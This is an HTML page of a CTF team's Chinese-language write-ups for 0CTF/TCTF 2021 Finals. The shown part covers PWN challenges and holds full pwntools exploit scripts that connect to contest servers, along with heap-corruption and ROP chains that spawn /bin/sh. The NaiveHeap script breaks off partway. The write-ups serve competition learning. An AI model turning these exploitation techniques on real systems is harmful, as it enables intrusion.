<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>0CTF/TCTF 2021 Finals Writeup | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for 0CTF/TCTF 2021 Finals Writeup" />
    <meta property="og:description" content="Writeup for 0CTF/TCTF 2021 Finals Writeup" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      min-height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      min-height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                前言
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#0vm">0vm</a>
    
                <a class="dropdown-item" href="#secure-jit-ii">secure-jit-ii</a>
    
                <a class="dropdown-item" href="#promise">promise</a>
    
                <a class="dropdown-item" href="#naiveheap">naiveheap</a>
    
                <a class="dropdown-item" href="#babaheap">babaheap</a>
    
                <a class="dropdown-item" href="#kbrop">kbrop</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                reverse
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#bali">bali</a>
    
                <a class="dropdown-item" href="#halfhalf">halfhalf</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#buggyloader">buggyloader</a>
    
                <a class="dropdown-item" href="#win-win">win-win</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#babylogin">babylogin</a>
    
                <a class="dropdown-item" href="#ezmat">ezmat</a>
    
                <a class="dropdown-item" href="#ezrsa">ezrsa</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#eeenginx">eeenginx</a>
    
                <a class="dropdown-item" href="#boynextdoor">boynextdoor</a>
    
                <a class="dropdown-item" href="#how_to_generate">how_to_generate</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">前言</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#0vm" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">0vm</span>
            </a>
    
<a href="#secure-jit-ii" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">secure-jit-ii</span>
            </a>
    
<a href="#promise" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">promise</span>
            </a>
    
<a href="#naiveheap" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">naiveheap</span>
            </a>
    
<a href="#babaheap" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babaheap</span>
            </a>
    
<a href="#kbrop" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">kbrop</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">reverse</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#bali" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">bali</span>
            </a>
    
<a href="#halfhalf" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">halfhalf</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#buggyloader" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">buggyloader</span>
            </a>
    
<a href="#win-win" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">win-win</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            <a href="#babylogin" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babylogin</span>
            </a>
    
<a href="#ezmat" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ezmat</span>
            </a>
    
<a href="#ezrsa" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ezrsa</span>
            </a>
    
          </div>
    
          <a href="#submenu5" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu5" class="collapse sidebar-submenu">
            <a href="#eeenginx" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">eeenginx</span>
            </a>
    
<a href="#boynextdoor" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">boynextdoor</span>
            </a>
    
<a href="#how_to_generate" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">how_to_generate</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="0ctftctf-2021-finals-writeup"><a class="header-link" href="#0ctftctf-2021-finals-writeup"></a>0CTF/TCTF 2021 Finals Writeup</h1>
<h2 id="前言"><a class="header-link" href="#前言"></a>前言</h2>
<p>九月底和 r3kapig 的大师傅们一起打了国际比赛 TCTF/0CTF final，最终战队取得了世界排名第二，国内排名第一的好成绩，现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：<a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x72;&#x33;&#x6b;&#97;&#112;&#x69;&#103;&#46;&#x63;&#111;&#109;">&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x72;&#x33;&#x6b;&#97;&#112;&#x69;&#103;&#46;&#x63;&#111;&#109;</a></p>
<p class="img-container"><img src="img/1.jpg" alt="1"></p>
<h2 id="pwn"><a class="header-link" href="#pwn"></a>PWN</h2>
<h3 id="0vm"><a class="header-link" href="#0vm"></a>0VM</h3>
<p>实现了一个简单的虚拟机，只不过虚拟机的指令是做完快速傅里叶变换后的膜长拼接出来的。做逆快速傅里叶变换就能求出应有的输入。虚拟机操作的内存通过单链表方式组织，在取出之后并没有将 block 的 fd 指针位置清空，但是已经将该 block 对应 mask 置1，所以可以正常读取泄露该指针，从而计算出libc地址。同时还有逻辑问题，在向链表插入mask为0 的 block 地址时，是先将要插入的 block 地址对应的内存置空，然后再去检查该 block 对应的 mask，所以可以用该漏洞，对一个已经加入链表的 block 空间的内存进行部分写空字节。然后就是劫持链表伪造结构体，从而进行任意读写了。</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> os

context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>

<span class="hljs-comment"># io = process(&#x27;./0VM&#x27;)</span>
<span class="hljs-comment"># io = remote(&#x27;121.5.102.199&#x27;, 20000)</span>
<span class="hljs-comment"># io = remote(&#x27;192.168.163.135&#x27;, 20000)</span>
libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)

rl = <span class="hljs-keyword">lambda</span>    a=<span class="hljs-literal">False</span>        : io.recvline(a)
ru = <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>    : io.recvuntil(a,b)
rn = <span class="hljs-keyword">lambda</span> x            : io.recvn(x)
sn = <span class="hljs-keyword">lambda</span> x            : io.send(x)
sl = <span class="hljs-keyword">lambda</span> x            : io.sendline(x)
sa = <span class="hljs-keyword">lambda</span> a,b            : io.sendafter(a,b)
sla = <span class="hljs-keyword">lambda</span> a,b        : io.sendlineafter(a,b)
irt = <span class="hljs-keyword">lambda</span>            : io.interactive()
dbg = <span class="hljs-keyword">lambda</span> text=<span class="hljs-literal">None</span>  : gdb.attach(io, text)
<span class="hljs-comment"># lg = lambda s,addr        : log.info(&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27; % (s,addr))</span>
lg = <span class="hljs-keyword">lambda</span> s            : log.info(<span class="hljs-string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))
uu32 = <span class="hljs-keyword">lambda</span> data        : u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))
uu64 = <span class="hljs-keyword">lambda</span> data        : u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))

text =<span class="hljs-string">&#x27;&#x27;&#x27;heapinfo
&#x27;&#x27;&#x27;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrap</span>(<span class="hljs-params">op, parm1, parm2, parm3</span>):</span>
    cmd = <span class="hljs-string">&quot;./FFT &quot;</span>
    cmd += <span class="hljs-built_in">str</span>(op) + <span class="hljs-string">&quot; &quot;</span>
    cmd += <span class="hljs-built_in">str</span>(parm1) + <span class="hljs-string">&quot; &quot;</span>
    cmd += <span class="hljs-built_in">str</span>(parm2) + <span class="hljs-string">&quot; &quot;</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> p64(parm3):
        cmd += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(x)) + <span class="hljs-string">&quot; &quot;</span>
    f = os.popen(cmd)
    res = f.readlines()
    final = <span class="hljs-string">&quot;&quot;</span>.join(res)
    <span class="hljs-comment"># print final.encode(&#x27;hex&#x27;)</span>
    sn(final)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vm1_copy_data</span>(<span class="hljs-params">idx1, idx2</span>):</span>
    wrap(<span class="hljs-number">1</span>, idx1, idx2, <span class="hljs-number">0</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vm2_assi_data</span>(<span class="hljs-params">idx, val</span>):</span>
    wrap(<span class="hljs-number">2</span>, idx, <span class="hljs-number">0</span>, val)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vm3_read_from_data</span>(<span class="hljs-params">idx, val</span>):</span>
    wrap(<span class="hljs-number">3</span>, idx, <span class="hljs-number">0</span>, val)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vm4_write_to_data</span>(<span class="hljs-params">idx, val</span>):</span>
    wrap(<span class="hljs-number">4</span>, idx, <span class="hljs-number">0</span>, val)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vm5_add_data</span>(<span class="hljs-params">idx1, idx2</span>):</span>
    wrap(<span class="hljs-number">5</span>, idx1, idx2, <span class="hljs-number">0</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vmf1_show_map</span>(<span class="hljs-params">val</span>):</span>
    wrap(<span class="hljs-number">0xf</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, val)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vmf2_alloc_map</span>(<span class="hljs-params">val</span>):</span>
    wrap(<span class="hljs-number">0xf</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, val)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vmf3_edit_map</span>(<span class="hljs-params">val</span>):</span>
    wrap(<span class="hljs-number">0xf</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, val)


<span class="hljs-comment"># io = process(&#x27;./0VM&#x27;)</span>
io = remote(<span class="hljs-string">&#x27;121.5.102.199&#x27;</span>, <span class="hljs-number">20000</span>)
<span class="hljs-comment"># io = remote(&#x27;192.168.163.135&#x27;, 20000)</span>
ru(<span class="hljs-string">&quot;  #\n\n&quot;</span>)

<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0x40</span>):
    vmf2_alloc_map(<span class="hljs-number">0x82</span>*<span class="hljs-number">0x10</span>) 

vmf3_edit_map(<span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0</span>)
vmf3_edit_map(<span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0x820</span>+<span class="hljs-number">0x10</span>)

vmf2_alloc_map(<span class="hljs-number">0x82</span>*<span class="hljs-number">0x10</span>)

vmf1_show_map(<span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0</span>) 

libc_base = uu64(rn(<span class="hljs-number">8</span>)) + <span class="hljs-number">0x237d0</span>
lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)


mmap_addr = libc_base + <span class="hljs-number">0x36f000</span>
target_addr = mmap_addr + <span class="hljs-number">8</span>*<span class="hljs-number">0x83</span>
vm2_assi_data(<span class="hljs-number">1</span>, target_addr)
vm3_read_from_data(<span class="hljs-number">1</span>, <span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0x820</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x7c0</span>)

vmf3_edit_map(<span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0x820</span>*<span class="hljs-number">3</span>)

vmf3_edit_map(<span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0x820</span>+<span class="hljs-number">0x10</span>-<span class="hljs-number">7</span>) 

vmf3_edit_map(<span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0x820</span>*<span class="hljs-number">4</span>)

<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">4</span>):
    vmf2_alloc_map(<span class="hljs-number">0x82</span>*<span class="hljs-number">0x10</span>)

io_file_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]
vm2_assi_data(<span class="hljs-number">1</span>, io_file_jumps)
vm3_read_from_data(<span class="hljs-number">1</span>, <span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0x820</span>*<span class="hljs-number">4</span>) 

vm2_assi_data(<span class="hljs-number">1</span>, <span class="hljs-number">0x0101010101010101</span>)
vm3_read_from_data(<span class="hljs-number">1</span>, <span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0x820</span>*<span class="hljs-number">4</span>+<span class="hljs-number">0x10</span>)

system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
vm2_assi_data(<span class="hljs-number">1</span>, system_addr)
vm3_read_from_data(<span class="hljs-number">1</span>, <span class="hljs-number">0x83</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0</span>+<span class="hljs-number">0x18</span>)

stderr_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]
vm2_assi_data(<span class="hljs-number">1</span>, stderr_addr)
vm3_read_from_data(<span class="hljs-number">1</span>, <span class="hljs-number">0x82</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0x820</span>*<span class="hljs-number">4</span>) 

binsh = u64(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)
vm2_assi_data(<span class="hljs-number">1</span>, binsh)
vm3_read_from_data(<span class="hljs-number">1</span>, <span class="hljs-number">0x83</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0</span>) 

vm2_assi_data(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)
vm3_read_from_data(<span class="hljs-number">1</span>, <span class="hljs-number">0x83</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0</span>+<span class="hljs-number">0x20</span>)

vm2_assi_data(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)
vm3_read_from_data(<span class="hljs-number">1</span>, <span class="hljs-number">0x83</span>&lt;&lt;<span class="hljs-number">32</span> | <span class="hljs-number">0</span>+<span class="hljs-number">0x28</span>) 

wrap(<span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
<span class="hljs-comment"># dbg(text)</span>
<span class="hljs-comment"># pause()</span>

irt()</code></pre><h3 id="secure-jit-ii"><a class="header-link" href="#secure-jit-ii"></a>Secure JIT II</h3>
<p>OOB写直接ROP</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>
    a = array(<span class="hljs-number">7</span>)
    a[<span class="hljs-number">0</span>] = <span class="hljs-number">0x20192019</span>
    a[<span class="hljs-number">10</span>] = <span class="hljs-number">0x421873</span> <span class="hljs-comment"># ret</span>
    a[<span class="hljs-number">11</span>] = <span class="hljs-number">0x421095</span> <span class="hljs-comment"># pop rax</span>
    a[<span class="hljs-number">12</span>] = <span class="hljs-number">59</span>
    a[<span class="hljs-number">13</span>] = <span class="hljs-number">0x421872</span> <span class="hljs-comment"># pop rdi</span>
    a[<span class="hljs-number">14</span>] = <span class="hljs-number">0xa83ff0</span>
    a[<span class="hljs-number">15</span>] = <span class="hljs-number">0x42159a</span> <span class="hljs-comment"># pop rsi</span>
    a[<span class="hljs-number">16</span>] = <span class="hljs-number">0x6e69622f</span>
    a[<span class="hljs-number">17</span>] = <span class="hljs-number">0x4b2582</span> <span class="hljs-comment"># 0x4b24d2</span>
    a[<span class="hljs-number">25</span>] = <span class="hljs-number">0x421872</span> <span class="hljs-comment"># pop rdi</span>
    a[<span class="hljs-number">26</span>] = <span class="hljs-number">0xa83ff4</span>
    a[<span class="hljs-number">27</span>] = <span class="hljs-number">0x42159a</span> <span class="hljs-comment"># pop rsi</span>
    a[<span class="hljs-number">28</span>] = <span class="hljs-number">0x68732f</span>
    a[<span class="hljs-number">29</span>] = <span class="hljs-number">0x4b2582</span> <span class="hljs-comment"># 0x4b24d2</span>
    a[<span class="hljs-number">37</span>] = <span class="hljs-number">0x421872</span> <span class="hljs-comment"># pop rdi</span>
    a[<span class="hljs-number">38</span>] = <span class="hljs-number">0xa83ff0</span>
    a[<span class="hljs-number">39</span>] = <span class="hljs-number">0x42159a</span> <span class="hljs-comment"># pop rsi</span>
    a[<span class="hljs-number">40</span>] = <span class="hljs-number">0</span>
    a[<span class="hljs-number">41</span>] = <span class="hljs-number">0x4026c1</span> <span class="hljs-comment"># pop rdx</span>
    a[<span class="hljs-number">42</span>] = <span class="hljs-number">0</span>
    a[<span class="hljs-number">43</span>] = <span class="hljs-number">0x4ff807</span> <span class="hljs-comment">#0x43430c # syscall</span>

    <span class="hljs-comment"># 0x4b2582 # 0x4b24d2 [rdi]=rsi; rsp+=0x38</span>
</code></pre><h3 id="promise"><a class="header-link" href="#promise"></a>promise</h3>
<p><a href="https://mem2019.github.io/jekyll/update/2021/09/27/TCTF2021-Promise.html">https://mem2019.github.io/jekyll/update/2021/09/27/TCTF2021-Promise.html</a></p>
<h3 id="naiveheap"><a class="header-link" href="#naiveheap"></a>NaiveHeap</h3>
<ol class="list">
<li>漏洞点是任意地址内存中指针的一次free，可以free tache的结构体，之后就可以重复利用。</li>
<li>重复利用tache结构体构造overlap。</li>
<li>修改size获得unsorted bin，partial write unsorted bin的fd把main_arena的bitsmap当作head。</li>
<li>一路往下写写到stdout，泄露libc，之后free_hook进行rop。</li>
<li>上一部分往下覆盖路过一个指针，如果指针指向内容不能读就会segfault，可以通过写另一个 fake size，然后利用free往上面打一个tcache的结构体地址，这样保证了那个地址可读</li>
</ol>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>

<span class="hljs-comment"># io = process(&#x27;./chall&#x27;, aslr=False)</span>
<span class="hljs-comment"># io = process(&#x27;./pwn&#x27;, aslr=False)</span>
<span class="hljs-comment"># io = remote(&#x27;127.0.0.1&#x27;, 4455)</span>
io = remote(<span class="hljs-string">&#x27;1.117.189.158&#x27;</span>, <span class="hljs-number">60001</span>)
<span class="hljs-comment"># elf = ELF(&#x27;./chall&#x27;)</span>
<span class="hljs-comment"># libc = elf.libc</span>

rl = <span class="hljs-keyword">lambda</span>    a=<span class="hljs-literal">False</span>        : io.recvline(a)
ru = <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>    : io.recvuntil(a,b)
rn = <span class="hljs-keyword">lambda</span> x            : io.recvn(x)
sn = <span class="hljs-keyword">lambda</span> x            : io.send(x)
sl = <span class="hljs-keyword">lambda</span> x            : io.sendline(x)
sa = <span class="hljs-keyword">lambda</span> a,b            : io.sendafter(a,b)
sla = <span class="hljs-keyword">lambda</span> a,b        : io.sendlineafter(a,b)
irt = <span class="hljs-keyword">lambda</span>            : io.interactive()
dbg = <span class="hljs-keyword">lambda</span> text=<span class="hljs-literal">None</span>  : gdb.attach(io, text)
lg = <span class="hljs-keyword">lambda</span> s,addr        : log.info(<span class="hljs-string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s,addr))
lg = <span class="hljs-keyword">lambda</span> s            : log.info(<span class="hljs-string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))
uu32 = <span class="hljs-keyword">lambda</span> data        : u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))
uu64 = <span class="hljs-keyword">lambda</span> data        : u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))

text =<span class="hljs-string">&#x27;&#x27;&#x27;heapinfo
&#x27;&#x27;&#x27;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Gift</span>(<span class="hljs-params">offset</span>):</span>
    sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))
    sl(offset)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add_Del</span>(<span class="hljs-params">size, content</span>):</span>
    sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
    sl(<span class="hljs-built_in">str</span>(size))
    sl(content)

Gift(<span class="hljs-string">&#x27;-&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0xa0160</span>/<span class="hljs-number">8</span>))
Gift(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))


Add_Del(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;&#x27;</span>)
Add_Del(<span class="hljs-number">0x200</span>, <span class="hljs-string">&#x27;&#x27;</span>)
Add_Del(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;&#x27;</span>)

payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>
payload += p64(<span class="hljs-number">0x0001000000000000</span>)
